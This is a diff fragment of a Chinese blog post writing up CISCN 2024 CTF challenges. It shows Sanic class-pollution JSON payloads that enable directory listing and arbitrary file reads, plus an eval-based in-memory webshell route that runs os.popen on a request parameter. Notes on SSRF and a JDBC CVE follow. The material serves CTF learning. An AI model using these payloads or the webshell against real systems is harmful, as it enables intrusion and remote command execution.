+<h4 id="最终payload"><a href="#最终payload" class="headerlink" title="最终payload"></a>最终payload</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token string">"True"</span> <span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"/"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2024/05/18/CISCN2024/image-20240523014010104.png" alt="image-20240523014010104"></p>
+<p>然后污染<code>__file__</code>为flag的名称，再访问&#x2F;src得到flag</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"__init__\\\\.__globals__\\\\.__file__"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token string">"/24bcbd0192e591d6ded1_flag"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="其它文件读取的方法"><a href="#其它文件读取的方法" class="headerlink" title="其它文件读取的方法"></a>其它文件读取的方法</h3><p>gxn师傅tql！</p>
+<p>类似于flask中的<code>_static_url_path</code>，污染了以后可以通过路由直接访问到文件</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token string">"/"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h3><p>累了，直接搬gxn师傅的图了（</p>
+<p><img src="/blog/2024/05/18/CISCN2024/image-20240523014519823.png" alt="image-20240523014519823"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'app.add_route(lambda request: __import__("os").popen(request.args.get("gxngxngxn")).read(),"/gxngxngxn", methods=["GET", "POST"])'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/05/18/CISCN2024/image-20240523014542230.png" alt="image-20240523014542230"></p>
+<p>于是在报错中回成功会回显命令的执行结果（或许可以在pickle条件下使用？</p>
 <hr>
 <h2 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h2><p>第一天晚上专门审了下源码里ssrf的洞，第二天早上看到题目直接狂喜，以为要找另一个ssrf的洞，没想到根本不是。。</p>
 <p>说是ban了第一天的洞，不过还是要打ssrf，猜测ban的是qrcode那个路由</p>
@@ -1437,6 +1611,7 @@ waff<span class="token punctuation">(</span><span class="token punctuation">)</s
 <p>CVE-2023-32697</p>
 </blockquote>
 <p>jdbc打数据库，给了mysql，psql和sqlite三个数据库接口，但是我不会jdbc</p>
+<p>看一下依赖：mysql-connector-java-8.0.13.jar</p>
 
     </div>
     
